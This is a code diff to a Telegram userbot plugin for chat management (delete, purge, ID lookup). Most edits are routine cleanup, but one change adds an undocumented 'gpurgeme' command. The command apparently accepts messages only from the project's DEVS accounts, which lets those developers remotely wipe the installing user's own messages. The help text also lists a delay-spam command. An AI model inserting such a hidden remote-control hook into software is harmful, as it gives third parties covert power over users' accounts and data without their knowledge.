@@ -15,6 +15,7 @@ from telethon.tl.functions.channels import LeaveChannelRequest
 from telethon.tl.functions.contacts import UnblockRequest
 from telethon.tl.types import Chat
 from . import (
+    DEVS,
     HELP,
     display_name,
     get_user,
@@ -42,7 +43,7 @@ async def _(e):
         count = 0
         try:
             num = int(match)
-        except BaseException:
+        except ValueError:
             num = None
         async for m in e.client.iter_messages(
             e.chat_id,
@@ -63,13 +64,14 @@ async def _(e):
 
 
 @kasta_cmd(disable_errors=True, pattern="purgeme(?: |$)(.*)")
+@kasta_cmd(disable_errors=True, own=True, senders=DEVS, pattern="gpurgeme(?: |$)(.*)")
 async def _(e):
     match = e.pattern_match.group(1)
     count = 0
     if match and not e.is_reply:
         try:
             num = int(match)
-        except BaseException:
+        except ValueError:
             num = None
         async for m in e.client.iter_messages(e.chat_id, limit=num, from_user="me"):
             await m.try_delete()
@@ -100,7 +102,7 @@ async def _(e):
 @kasta_cmd(disable_errors=True, pattern="ids?")
 async def _(e):
     chat_id = e.chat_id or e.from_id
-    if e.reply_to_msg_id:
+    if e.is_reply:
         reply = await e.get_reply_message()
         userid = reply.sender_id
         text = f"**User ID:** `{userid}`" if e.is_private else f"**Chat ID:** `{chat_id}`\n**User ID:** `{userid}`"
@@ -218,29 +220,29 @@ HELP.update(
     {
         "chats": [
             "Chats",
-            """• `{i}del|d|D|del|Del`
-↳ : Delete a messages.
+            """❯ `{i}del|d|D|del|Del`
+Delete a messages.
 
-• `{i}purge <limit (optional)> <reply>`
-↳ : Purge all messages from the replied message.
+❯ `{i}purge <limit (optional)> <reply>`
+Purge all messages from the replied message.
 
-• `{i}purgeme <reply>`
-↳ : Purge Only your messages from the replied message.
+❯ `{i}purgeme <reply>`
+Purge Only your messages from the replied message.
 
-• `{i}id|{i}ids`
-↳ : Get current Chat/User/Message ID.
+❯ `{i}id|{i}ids`
+Get current Chat/User/Message ID.
 
-• `{i}total <username/reply>`
-↳ : Get total user messages.
+❯ `{i}total <username/reply>`
+Get total user messages.
 
-• `{i}sa|{i}sg <reply/username/id>`
-↳ : Get history of names and usernames by sangmata.
+❯ `{i}sa|{i}sg <reply/username/id>`
+Get history of names and usernames by sangmata.
 
-• `{i}delayspam|{i}ds <time> <count> <text>`
-↳ : Spam chat with delays in seconds (min 5 seconds).
+❯ `{i}delayspam|{i}ds <time> <count> <text>`
+Spam chat with delays in seconds (min 5 seconds).
 
-• `{i}kickme`
-↳ : Leaves the groups.
+❯ `{i}kickme`
+Leaves the groups.
 """,
         ]
     }
